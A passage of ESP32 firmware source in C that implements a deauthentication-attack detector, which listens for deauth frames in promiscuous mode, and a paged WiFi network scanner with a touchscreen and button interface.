      DeauthDetect_displayPrint(TEXT(line), UI_WARN, true);
    }
  }
}

static void DeauthDetect_deauthBeginListen(void) {
  esp_wifi_set_promiscuous_rx_cb(DeauthDetect_snifferCallback);
  esp_wifi_set_promiscuous(true);
  DeauthDetect_s_phase = DeauthDetect_DeauthPhase_Listen;
  DeauthDetect_s_listenUntilMs = sys_monotonic_ms() + 5000;
}

static void DeauthDetect_deauthAbortAsyncScan(void) {
  if (DeauthDetect_s_asyncScanActive) {
    (void)esp_wifi_scan_stop();
    network_clear_scan();
    DeauthDetect_s_asyncScanActive = false;
  }
}

static void DeauthDetect_deauthStepScan(void) {
  if (DeauthDetect_stopScan) {
    DeauthDetect_deauthBeginListen();
    return;
  }

  if (!DeauthDetect_s_scanBannerShown) {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    network_clear_scan();
    DeauthDetect_displayPrint(TEXT("[*] Scanning WiFi networks"), UI_TEXT,
                              true);
    DeauthDetect_s_scanBannerShown = true;
  }

  if (!DeauthDetect_s_asyncScanActive) {
    const uint32_t dwell = wifiStaScanMsPerChannel();
    const int ret = network_scan(true, true, false, dwell);
    if (ret == NETWORK_SCAN_RUNNING) {
      DeauthDetect_s_asyncScanActive = true;
      return;
    }
    if (ret < 0) {
      DeauthDetect_s_scanBannerShown = false;
      DeauthDetect_deauthBeginListen();
      return;
    }
    DeauthDetect_deauthPopulateScanResults(ret);
    if (!DeauthDetect_stopScan && ret > 0) {
      DeauthDetect_analyzeNetworks(ret);
    }
    DeauthDetect_s_scanBannerShown = false;
    DeauthDetect_deauthBeginListen();
    return;
  }

  const int n = network_scan_result_count();
  if (n == NETWORK_SCAN_RUNNING) {
    if (feature_exit_requested || featureExitButtonPressed()) {
      DeauthDetect_exitMode = true;
      DeauthDetect_deauthAbortAsyncScan();
    }
    return;
  }

  DeauthDetect_s_asyncScanActive = false;
  if (n < 0) {
    DeauthDetect_s_scanBannerShown = false;
    DeauthDetect_deauthBeginListen();
    return;
  }

  DeauthDetect_deauthPopulateScanResults(n);
  if (!DeauthDetect_stopScan && n > 0) {
    DeauthDetect_analyzeNetworks(n);
  }
  DeauthDetect_s_scanBannerShown = false;
  DeauthDetect_deauthBeginListen();
}

static void DeauthDetect_deauthStepListen(void) {
  if (!DeauthDetect_stopScan &&
      sys_monotonic_ms() >= DeauthDetect_s_listenUntilMs) {
    DeauthDetect_s_phase = DeauthDetect_DeauthPhase_Scanning;
    DeauthDetect_s_scanBannerShown = false;
  }
}

static void DeauthDetect_deauthTeardown(void) {
  DeauthDetect_deauthAbortAsyncScan();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  network_clear_scan();
  network_disconnect_options(false, false);
  DeauthDetect_stopScan = false;
  DeauthDetect_exitMode = false;
  DeauthDetect_lineIndex = 0;
  DeauthDetect_s_phase = DeauthDetect_DeauthPhase_Scanning;
  DeauthDetect_s_asyncScanActive = false;
  DeauthDetect_s_scanBannerShown = false;
  DeauthDetect_s_knownNetworkCount = 0;
  DeauthDetect_deauthAlertPending = false;
  DeauthDetect_deauthAlertIndex = -1;
}

static bool DeauthDetect_uiDrawn = false;

void DeauthDetect_runUI(void) {
  display_draw_fast_h_line(&(tft), 0, 19, display_width(&(tft)), UI_LINE);

  static const unsigned char* DeauthDetect_icons[ICON_NUM] = {
      bitmap_icon_start, bitmap_icon_go_back};

  if (!DeauthDetect_uiDrawn) {
    display_set_text_font(&(tft), 1);
    display_fill_rect(&(tft), 0, 20, 140, 16, DARK_GRAY);
    display_set_text_color_2(&(tft), UI_TEXT, DARK_GRAY);
    display_set_text_size(&(tft), 1);
    display_set_cursor(&(tft), 35, 24);
    display_print(&(tft), "Scanning WiFi");

    display_draw_fast_h_line(&(tft), 0, 19, display_width(&(tft)), UI_LINE);
    display_fill_rect(&(tft), 140, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 140,
                      STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (DeauthDetect_icons[i] != NULL) {
        display_draw_bitmap(&(tft), DeauthDetect_iconX[i], DeauthDetect_iconY,
                            DeauthDetect_icons[i], ICON_SIZE, ICON_SIZE,
                            UI_ICON);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    DeauthDetect_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && sys_monotonic_ms() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      display_draw_bitmap(&(tft), DeauthDetect_iconX[activeIcon],
                          DeauthDetect_iconY, DeauthDetect_icons[activeIcon],
                          ICON_SIZE, ICON_SIZE, UI_ICON);
      animationState = 2;

      switch (activeIcon) {
        case 0:
          DeauthDetect_displayPrint(TEXT("[!] Scanning Stopped"), UI_WARN,
                                    true);
          DeauthDetect_displayPrint(TEXT("[!] Press [Select] to Exit"), UI_WARN,
                                    false);
          DeauthDetect_stopScan = true;
          animationState = 0;
          activeIcon = -1;
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = sys_monotonic_ms();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (sys_monotonic_ms() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > DeauthDetect_iconX[i] &&
              x < DeauthDetect_iconX[i] + ICON_SIZE) {
            if (DeauthDetect_icons[i] != NULL && animationState == 0) {
              if (i == 1) {
                DeauthDetect_displayPrint(TEXT("[!] Scanning Stopped"), UI_WARN,
                                          true);
                DeauthDetect_stopScan = true;
                DeauthDetect_exitMode = true;
              } else {
                display_draw_bitmap(&(tft), DeauthDetect_iconX[i],
                                    DeauthDetect_iconY, DeauthDetect_icons[i],
                                    ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = sys_monotonic_ms();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

void DeauthDetect_deauthdetectSetup(void) {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  setTouchNavLabels(NULL, NULL, "Exit", "Pause", NULL);
  DeauthDetect_stopScan = false;
  DeauthDetect_exitMode = false;
  DeauthDetect_lineIndex = 0;
  DeauthDetect_uiDrawn = false;
  DeauthDetect_deauthAlertPending = false;
  DeauthDetect_deauthAlertIndex = -1;
  DeauthDetect_s_asyncScanActive = false;
  DeauthDetect_s_scanBannerShown = false;
  DeauthDetect_s_knownNetworkCount = 0;
  DeauthDetect_s_phase = DeauthDetect_DeauthPhase_Listen;
  DeauthDetect_s_listenUntilMs = sys_monotonic_ms() + 600;

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  DeauthDetect_deauthAbortAsyncScan();

  memset(DeauthDetect_deauth, 0, sizeof(DeauthDetect_deauth));
  memset(DeauthDetect_macList, 0, sizeof(DeauthDetect_macList));
  for (int i = 0; i < DeauthDetect_DEAUTH_TERM_CAPACITY; i++) {
    DeauthDetect_terminalBuffer[i] = TEXT("");
    DeauthDetect_colorBuffer[i] = TFT_BLACK;
  }

  featureClearContent(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, true);
  redrawTouchButtonBar();

  network_clear_scan();
  network_set_mode(WIFI_MODE_STA);
  network_disconnect_options(false, false);
  sys_sleep_ms(100);

#if HAS_PCF8574_BUTTONS
  pcf8574_configure_pin(button_input_device(), BTN_UP, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_DOWN, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_LEFT, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_RIGHT, GPIO_MODE_INPUT);
#endif

  setupTouchscreen();

  DeauthDetect_uiDrawn = false;
  DeauthDetect_runUI();
  DeauthDetect_displayPrint(TEXT("[*] Starting deauth monitor"), UI_TEXT,
                            false);
  redrawTouchButtonBar();
}

void DeauthDetect_deauthdetectLoop(void) {
  if (feature_active &&
      (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
    DeauthDetect_stopScan = true;
    DeauthDetect_exitMode = true;
  }

  DeauthDetect_checkButtonPress();
  DeauthDetect_runUI();
  DeauthDetect_deauthFlushPendingAlert();
  updateStatusBar();
  maintainTouchNavBar();
  display_draw_fast_h_line(&(tft), 0, 19, display_width(&(tft)), UI_LINE);

  if (DeauthDetect_exitMode) {
    DeauthDetect_deauthTeardown();
    feature_exit_requested = true;
    return;
  }

  if (DeauthDetect_s_phase == DeauthDetect_DeauthPhase_Scanning) {
    DeauthDetect_deauthStepScan();
  } else {
    DeauthDetect_deauthStepListen();
  }

  sys_sleep_ms(20);
}

#define SCREEN_WIDTH TFT_WIDTH
#define SCREENHEIGHT TFT_HEIGHT
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 2

int WifiScan_currentIndex = 0;
int WifiScan_listStartIndex = 0;
bool WifiScan_isDetailView = false;
bool WifiScan_isScanning = false;
bool WifiScan_exitRequested = false;

static volatile bool WifiScan_bgHasResults = false;
static volatile uint32_t WifiScan_bgLastScanMs = 0;
enum { WifiScan_BG_SCAN_INTERVAL_MS = 15000 };

enum { WifiScan_BG_BOOT_GRACE_MS = 6000 };
static volatile bool WifiScan_bgScanRunning = false;
static volatile bool WifiScan_fgWifiScanInProgress = false;
static uint32_t WifiScan_bgBootMs = 0;

static void WifiScan_stopBgWifiScanIfRunning(void) {
  if (WifiScan_fgWifiScanInProgress) return;
  if (!WifiScan_bgScanRunning &&
      network_scan_result_count() != NETWORK_SCAN_RUNNING)
    return;
  if (network_scan_result_count() != NETWORK_SCAN_RUNNING) {
    WifiScan_bgScanRunning = false;
    return;
  }
  (void)esp_wifi_scan_stop();
  const uint32_t start = sys_monotonic_ms();
  while (network_scan_result_count() == NETWORK_SCAN_RUNNING &&
         (sys_monotonic_ms() - start) < 5000u) {
    vTaskDelay(10 / portTICK_PERIOD_MS);
  }
  WifiScan_bgScanRunning = false;
}

void WifiScan_startBackgroundScanner(void) {
  WifiScan_bgBootMs = sys_monotonic_ms();
}
void WifiScan_pauseBackgroundScanner(void) {
  if (WifiScan_bgScanRunning) {
    esp_wifi_scan_stop();
    WifiScan_bgScanRunning = false;
  }
}
void WifiScan_pollBackgroundScanner(void) {
  static uint32_t nextScan = 0;
  const uint32_t now = sys_monotonic_ms();
  if (!(*settings()).autoWifiScan || feature_active || in_sub_menu) {
    WifiScan_pauseBackgroundScanner();
    return;
  }
  if (now - WifiScan_bgBootMs < WifiScan_BG_BOOT_GRACE_MS) return;
  if (WifiScan_bgScanRunning) {
    int count = network_scan_result_count();
    if (count == NETWORK_SCAN_RUNNING) return;
    WifiScan_bgScanRunning = false;
    WifiScan_bgHasResults = count >= 0;
    WifiScan_bgLastScanMs = now;
    nextScan = now + WifiScan_BG_SCAN_INTERVAL_MS;
  } else if (((int32_t)(now - nextScan)) >= 0) {
    WifiScan_bgScanRunning =
        network_scan(true, true, false, wifiStaScanMsPerChannel()) ==
        NETWORK_SCAN_RUNNING;
    if (!WifiScan_bgScanRunning) nextScan = now + 2000;
  }
}

int WifiScan_getLastCount(void) {
  if (!(*settings()).autoWifiScan) return 0;
  int n = network_scan_result_count();
  return (n < 0) ? 0 : n;
}

bool WifiScan_wifiCacheValidForReuse(void) {
  if (!(*settings()).autoWifiScan || !WifiScan_bgHasResults) return false;
  return network_scan_result_count() > 0;
}

int WifiScan_staWifiScanSync(void) {
  pauseBackgroundRadioTasks();
  if (WifiScan_bgScanRunning) {
    WifiScan_stopBgWifiScanIfRunning();
  }
  network_clear_scan();
  network_set_mode(WIFI_MODE_STA);
  network_disconnect_options(false, false);
  sys_sleep_ms(50);
  const uint32_t dwell = wifiStaScanMsPerChannel();
  WifiScan_fgWifiScanInProgress = true;
  const int n = network_scan(false, true, false, dwell);
  WifiScan_fgWifiScanInProgress = false;
  if (n >= 0) {
    WifiScan_bgHasResults = true;
    WifiScan_bgLastScanMs = sys_monotonic_ms();
  }
  return n;
}

bool WifiScan_loadApListFromWifiCache(wifi_ap_record_t** ap_list,
                                      int* network_count,
                                      int (*compare_ap)(const void*,
                                                        const void*)) {
  if (!WifiScan_wifiCacheValidForReuse() || !ap_list || !network_count ||
      !compare_ap) {
    return false;
  }
  const int n = network_scan_result_count();
  if (n <= 0) return false;

  if (*ap_list) {
    free(*ap_list);
    *ap_list = NULL;
  }
  *network_count = n;
  *ap_list = (wifi_ap_record_t*)malloc((size_t)n * sizeof(wifi_ap_record_t));
  if (!*ap_list) {
    *network_count = 0;
    return false;
  }
  for (int i = 0; i < n; i++) {
    wifi_ap_record_t ap_record = {0};
    memcpy(ap_record.bssid, network_bssid(i), 6);
    strncpy((char*)ap_record.ssid, (network_ssid(i)).data,
            sizeof(ap_record.ssid));
    ap_record.ssid[sizeof(ap_record.ssid) - 1] = '\0';
    ap_record.rssi = network_rssi(i);
    ap_record.primary = network_channel(i);
    ap_record.authmode = network_auth_mode(i);
    (*ap_list)[i] = ap_record;
  }
  qsort(*ap_list, (size_t)n, sizeof(wifi_ap_record_t), compare_ap);
  return true;
}

unsigned long WifiScan_scan_StartTime = 0;
const unsigned long WifiScan_scanTimeout = 2000;
unsigned long WifiScan_lastButtonPress = 0;
const unsigned long WifiScan_debounceTime = 200;

#undef MAX_SSID_LENGTH
#define MAX_SSID_LENGTH 10

// Deauther-like list geometry (bigger rows + paging + bottom tab bar).
enum { WifiScan_LIST_HEADER_Y = 50 };
enum { WifiScan_LIST_FIRST_ROW_Y = WifiScan_LIST_HEADER_Y + 20 };
enum { WifiScan_LIST_ROW_H = 22 };

static int WifiScan_wifiNetworksPerPage(void) {
  return DIV_MAX(
      1, (wifiListBottomY() - WifiScan_LIST_FIRST_ROW_Y) / WifiScan_LIST_ROW_H);
}

static void WifiScan_wifiScanClearBody(void) { wifiClearBody(TFT_BLACK); }

static void WifiScan_wifiScanUpdateNavLabels(void) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  if (WifiScan_isDetailView) {
    setTouchNavLabels("Scan", "Next", "Exit", "Prev", "Back");
  } else {
    setTouchNavLabels("Scan", "Next", "Exit", "Prev", "View");
  }
  redrawTouchButtonBar();
}

static int WifiScan_current_page = 0;

static bool WifiScan_uiDrawn = false;

static int WifiScan_iconX[ICON_NUM] = {220, 10};
static const unsigned char* WifiScan_icons[ICON_NUM] = {bitmap_icon_undo,
                                                        bitmap_icon_go_back};

static void WifiScan_drawButton(int x, int y, int w, int h, const char* label,
                                bool highlight, bool disabled) {
  FeatureUI_ButtonStyle style = highlight ? FeatureUI_ButtonStyle_Primary
                                          : FeatureUI_ButtonStyle_Secondary;
  FeatureUI_drawButtonRect(x, y, w, h, label, style, false, disabled, 1);
}

static void WifiScan_drawTabBar(const char* leftButton, bool leftDisabled,
                                const char* prevButton, bool prevDisabled,
                                const char* nextButton, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    WifiScan_wifiScanUpdateNavLabels();
    return;
  }
  display_fill_rect(&(tft), 0, 304, SCREEN_WIDTH, 16, FEATURE_BG);

  if (leftButton && leftButton[0])
    WifiScan_drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
  if (prevButton && prevButton[0])
    WifiScan_drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
  if (nextButton && nextButton[0])
    WifiScan_drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
}

static int WifiScan_last_rendered_page = -1;
static int WifiScan_last_rendered_index = -1;

static void WifiScan_drawNetworkRow(int i, int y, bool isSel) {
  char buf[64];
  char ssid[16];
  text_t fullSSID = network_ssid(i);
  strncpy(ssid, (fullSSID).data, 11);
  ssid[11] = '\0';
  if (strlen((fullSSID).data) > 11) strcat(ssid, "...");

  const int rssi = network_rssi(i);
  const int ch = network_channel(i);
  const int auth = network_auth_mode(i);
  const char* enc = (auth == WIFI_AUTH_OPEN) ? "OPEN" : "WPA2";
  snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, rssi,
           ch, enc);

  // Clear only this row (avoid overlapping next row).
  display_fill_rect(&(tft), 0, y, SCREEN_WIDTH, WifiScan_LIST_ROW_H, TFT_BLACK);

  display_set_cursor(&(tft), 2, y);
  display_set_text_color_2(&(tft), isSel ? ORANGE : WHITE, TFT_BLACK);
  display_print(&(tft), (TEXT(isSel ? ">" : " ")).data);

  display_set_cursor(&(tft), 10, y);
  display_set_text_color_2(
      &(tft), isSel ? ORANGE : (auth == WIFI_AUTH_OPEN ? ORANGE : WHITE),
      TFT_BLACK);
  display_print_line_cstr(&(tft), (TEXT(buf)).data);
}

void WifiScan_displayWiFiList(bool fullRedraw) {
  WifiScan_uiDrawn = false;
  int networkCount = network_scan_result_count();
  ESP_LOGI(kWifiScanTag, "displayWiFiList full=%d count=%d page=%d index=%d",
           fullRedraw ? 1 : 0, networkCount, WifiScan_current_page,
           WifiScan_currentIndex);

  if (fullRedraw) {
    display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
    WifiScan_wifiScanClearBody();
    display_set_text_size(&(tft), 1);
  }

  if (networkCount <= 0) {
    display_set_text_color_1(&(tft), GREEN);
    display_set_cursor(&(tft), 10, WifiScan_LIST_HEADER_Y);
    display_print_line_cstr(&(tft), "No networks found.");
    display_set_cursor(&(tft), 10, WifiScan_LIST_HEADER_Y + 12);
    display_print_line_cstr(&(tft), "Press Rescan.");
    WifiScan_drawTabBar("Rescan", false, "Prev", true, "Next", true);
    return;
  }

  // Clamp page in case network count changed.
  const int totalPages = (networkCount + WifiScan_wifiNetworksPerPage() - 1) /
                         WifiScan_wifiNetworksPerPage();
  if (WifiScan_current_page < 0) WifiScan_current_page = 0;
  if (WifiScan_current_page > totalPages - 1)
    WifiScan_current_page = DIV_MAX(0, totalPages - 1);

  WifiScan_listStartIndex =
      WifiScan_current_page * WifiScan_wifiNetworksPerPage();

  const bool pageChanged =
      (WifiScan_current_page != WifiScan_last_rendered_page);
  const bool needFull =
      fullRedraw || pageChanged || (WifiScan_last_rendered_index < 0);

  if (needFull) {
    // Full redraw list (keeps UI consistent with Deauther).
    WifiScan_wifiScanClearBody();
    display_set_text_color_1(&(tft), GREEN);
    display_set_cursor(&(tft), 10, WifiScan_LIST_HEADER_Y);
    display_print_line_cstr(&(tft), "Networks:");

    char page_buf[32];
    snprintf(page_buf, sizeof(page_buf), "Page %d/%d",
             WifiScan_current_page + 1, totalPages);
    display_set_cursor(&(tft), 180, WifiScan_LIST_HEADER_Y);
    display_set_text_color_1(&(tft), GREEN);
    display_print_line_cstr(&(tft), (TEXT(page_buf)).data);

    int y = WifiScan_LIST_FIRST_ROW_Y;
    const int end_index = DIV_MIN(
        WifiScan_listStartIndex + WifiScan_wifiNetworksPerPage(), networkCount);
    for (int i = WifiScan_listStartIndex;
         i < end_index && y < wifiListBottomY(); i++) {
      WifiScan_drawNetworkRow(i, y, (i == WifiScan_currentIndex));
      y += WifiScan_LIST_ROW_H;
    }

    const bool prevDisabled = (WifiScan_current_page == 0);
    const bool nextDisabled =
        ((WifiScan_current_page + 1) * WifiScan_wifiNetworksPerPage() >=
         networkCount);
    WifiScan_drawTabBar("Rescan", false, "Prev", prevDisabled, "Next",
                        nextDisabled);
    WifiScan_last_rendered_page = WifiScan_current_page;
    WifiScan_last_rendered_index = WifiScan_currentIndex;
    return;
  }

  // Incremental update: only redraw affected rows.
  if (WifiScan_last_rendered_index != WifiScan_currentIndex) {
    const int prev = WifiScan_last_rendered_index;
    const int now = WifiScan_currentIndex;

    if (prev >= WifiScan_listStartIndex &&
        prev < WifiScan_listStartIndex + WifiScan_wifiNetworksPerPage()) {
      const int row = prev - WifiScan_listStartIndex;
      const int y = WifiScan_LIST_FIRST_ROW_Y + row * WifiScan_LIST_ROW_H;
      WifiScan_drawNetworkRow(prev, y, false);
    }
    if (now >= WifiScan_listStartIndex &&
        now < WifiScan_listStartIndex + WifiScan_wifiNetworksPerPage()) {
      const int row = now - WifiScan_listStartIndex;
      const int y = WifiScan_LIST_FIRST_ROW_Y + row * WifiScan_LIST_ROW_H;
      WifiScan_drawNetworkRow(now, y, true);
    }
    WifiScan_last_rendered_index = WifiScan_currentIndex;
  }
}

void WifiScan_displayScanning(void) {
  WifiScan_uiDrawn = false;
  WifiScan_wifiScanClearBody();

  display_set_text_size(&(tft), 1);
  display_set_text_color_1(&(tft), GREEN);
  display_set_cursor(&(tft), 10, 50);
  display_print_line_cstr(&(tft), "Scanning.");
  loading(100, ORANGE, 0, 0, 3, true);
  display_set_cursor(&(tft), 10, 65);
  display_print_line_cstr(&(tft), "Wait a moment.");
  ESP_LOGI(kWifiScanTag, "displayScanning");
}

void WifiScan_startWiFiScan(void) {
  WifiScan_scan_StartTime = sys_monotonic_ms();
  WifiScan_isScanning = true;
  WifiScan_exitRequested = false;
  WifiScan_isDetailView = false;
  WifiScan_current_page = 0;
  WifiScan_currentIndex = 0;
  WifiScan_listStartIndex = 0;

  WifiScan_displayScanning();
  ESP_LOGI(kWifiScanTag,
           "startWiFiScan begin auto=%d bgRunning=%d bgHasResults=%d",
           (*settings()).autoWifiScan ? 1 : 0, WifiScan_bgScanRunning ? 1 : 0,
           WifiScan_bgHasResults ? 1 : 0);

  pauseBackgroundRadioTasks();
  if (WifiScan_bgScanRunning) {
    WifiScan_stopBgWifiScanIfRunning();
  }
  network_clear_scan();
  network_set_mode(WIFI_MODE_STA);
  network_disconnect_options(false, false);
  sys_sleep_ms(50);
  const uint32_t dwell = wifiStaScanMsPerChannel();
  WifiScan_fgWifiScanInProgress = true;
  int numNetworks = network_scan(true, true, false, dwell);
  ESP_LOGI(kWifiScanTag, "scanNetworks returned %d", numNetworks);
  if (numNetworks == NETWORK_SCAN_RUNNING) {
    while (network_scan_result_count() == NETWORK_SCAN_RUNNING) {
      if (feature_exit_requested || featureExitButtonPressed()) {
        (void)esp_wifi_scan_stop();
        WifiScan_fgWifiScanInProgress = false;
        WifiScan_isScanning = false;
        feature_exit_requested = true;
        ESP_LOGW(kWifiScanTag, "startWiFiScan aborted by exit");
        return;
      }
      sys_sleep_ms(50);
    }
    numNetworks = network_scan_result_count();
    ESP_LOGI(kWifiScanTag, "scanComplete after wait = %d", numNetworks);
  }
  WifiScan_fgWifiScanInProgress = false;
  WifiScan_isScanning = false;
  ESP_LOGI(kWifiScanTag, "scan finished, updating state");

  if (numNetworks >= 0) {
    WifiScan_bgHasResults = true;
    WifiScan_bgLastScanMs = sys_monotonic_ms();
    ESP_LOGI(kWifiScanTag, "cache updated bgHasResults=%d bgLastScanMs=%lu",
             WifiScan_bgHasResults ? 1 : 0,
             (unsigned long)WifiScan_bgLastScanMs);
  }

  ESP_LOGI(kWifiScanTag, "startWiFiScan done count=%d bgHasResults=%d",
           numNetworks, WifiScan_bgHasResults ? 1 : 0);
  ESP_LOGI(kWifiScanTag, "about to render scan list");
  WifiScan_displayWiFiList(true);
  ESP_LOGI(kWifiScanTag, "rendered scan list");
}

void WifiScan_displayWiFiDetails(void) {
  WifiScan_uiDrawn = false;
  WifiScan_wifiScanClearBody();

  const int networkCount = network_scan_result_count();
  if (networkCount <= 0) {
    WifiScan_isDetailView = false;
    WifiScan_displayWiFiList(true);
    return;
  }
  if (WifiScan_currentIndex < 0) WifiScan_currentIndex = 0;
  if (WifiScan_currentIndex >= networkCount)
    WifiScan_currentIndex = networkCount - 1;

  text_t ssid = network_ssid(WifiScan_currentIndex);
  text_t bssid = network_bssid_text(WifiScan_currentIndex);
  int rssi = network_rssi(WifiScan_currentIndex);
  int channel = network_channel(WifiScan_currentIndex);
  int encryption = network_auth_mode(WifiScan_currentIndex);
  bool isHidden = (strlen((ssid).data) == 0);
  int y = 50;

  float signalQuality = DIV_CLAMP(2 * (rssi + 100), 0, 100);
  float estimatedDistance = pow(10.0, (-69.0 - rssi) / (10.0 * 2.0));

  text_t encryptionType = {0};
  switch (encryption) {
    case WIFI_AUTH_OPEN:
      encryptionType = TEXT("Open");
      break;
    case WIFI_AUTH_WEP:
      encryptionType = TEXT("WEP");
      break;
    case WIFI_AUTH_WPA_PSK:
      encryptionType = TEXT("WPA");
      break;
    case WIFI_AUTH_WPA2_PSK:
      encryptionType = TEXT("WPA2");
      break;
    case WIFI_AUTH_WPA_WPA2_PSK:
      encryptionType = TEXT("WPA/WPA2");
      break;
    case WIFI_AUTH_WPA2_ENTERPRISE:
      encryptionType = TEXT("WPA2-Ent");
      break;
    default:
      encryptionType = TEXT("Unknown");
      break;
  }

  // NOTE: In this file TFT_WHITE is remapped to FEATURE_TEXT (orange).
  // Use real WHITE for normal detail text.
  display_set_text_color_2(&(tft), WHITE, TFT_BLACK);
  display_set_text_size(&(tft), 1);

  display_set_cursor(&(tft), 10, y);
  display_print(&(tft), "SSID: ");
  display_print(&(tft), ((isHidden ? TEXT("(Hidden)") : ssid)).data);
  y += 20;

  display_set_cursor(&(tft), 10, y);
  display_print(&(tft), "BSSID: ");
  display_print(&(tft), (bssid).data);
  y += 20;

  display_set_cursor(&(tft), 10, y);
  display_print(&(tft), "RSSI: ");
  display_print(&(tft), (TEXT(rssi)).data);
  display_print(&(tft), " dBm");
  y += 20;

  display_set_cursor(&(tft), 10, y);
  display_print(&(tft), "Signal: ");
  display_print(&(tft), (TEXT(signalQuality)).data);
  display_print(&(tft), "%");
  y += 20;

  display_set_cursor(&(tft), 10, y);
  display_print(&(tft), "Channel: ");
  display_print(&(tft), (TEXT(channel)).data);
  y += 20;

  display_set_cursor(&(tft), 10, y);
  display_print(&(tft), "Encryption: ");
  display_print(&(tft), (encryptionType).data);
  y += 20;

  display_set_cursor(&(tft), 10, y);
  display_print(&(tft), "Est. Distance: ");
  display_print(&(tft), (TEXT_FORMAT(estimatedDistance, 1)).data);
  display_print(&(tft), "m");

  WifiScan_drawTabBar("Rescan", false, "", true, "Back", false);
}

void WifiScan_handleButton(void) {
  unsigned long currentMillis = sys_monotonic_ms();
  if (currentMillis - WifiScan_lastButtonPress < WifiScan_debounceTime) return;

  bool updated = false;
  int oldPage = WifiScan_current_page;

  if (isButtonPressed(BTN_UP)) {
    if (!WifiScan_isDetailView && WifiScan_currentIndex > 0) {
      WifiScan_currentIndex--;
      sys_sleep_ms(200);
      WifiScan_current_page =
          WifiScan_currentIndex / DIV_MAX(1, WifiScan_wifiNetworksPerPage());
      updated = true;
    }
    WifiScan_lastButtonPress = currentMillis;
  }

  if (isButtonPressed(BTN_DOWN)) {
    if (!WifiScan_isDetailView &&
        WifiScan_currentIndex < network_scan_result_count() - 1) {
      WifiScan_currentIndex++;
      sys_sleep_ms(200);
      WifiScan_current_page =
          WifiScan_currentIndex / DIV_MAX(1, WifiScan_wifiNetworksPerPage());
      updated = true;
    }
    WifiScan_lastButtonPress = currentMillis;
  }

  if (isButtonPressed(BTN_RIGHT)) {
    sys_sleep_ms(200);
    if (!WifiScan_isScanning) {
      WifiScan_isDetailView = !WifiScan_isDetailView;
      updated = true;
    }
    WifiScan_lastButtonPress = currentMillis;
  }

  if (isButtonPressed(BTN_LEFT)) {
    sys_sleep_ms(200);
    if (WifiScan_isDetailView) {
      WifiScan_isDetailView = false;
    } else if (!WifiScan_isScanning) {
      WifiScan_startWiFiScan();
    }
    updated = true;
    WifiScan_lastButtonPress = currentMillis;
  }

  if (updated) {
    if (WifiScan_isDetailView)
      WifiScan_displayWiFiDetails();
    else
      WifiScan_displayWiFiList(WifiScan_current_page != oldPage);
  }
}

void WifiScan_runUI(void) {
  static int iconY = STATUS_BAR_Y_OFFSET;

  if (!WifiScan_uiDrawn) {
    display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
    display_fill_rect(&(tft), 0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (WifiScan_icons[i] != NULL) {
        display_draw_bitmap(&(tft), WifiScan_iconX[i], iconY, WifiScan_icons[i],
                            ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    WifiScan_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && sys_monotonic_ms() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      display_draw_bitmap(&(tft), WifiScan_iconX[activeIcon], iconY,
                          WifiScan_icons[activeIcon], ICON_SIZE, ICON_SIZE,
                          TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0:
          if (!WifiScan_isScanning) {
            WifiScan_startWiFiScan();
          }
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = sys_monotonic_ms();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 120;
  static uint32_t lastTouchActionMs = 0;

  if (sys_monotonic_ms() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
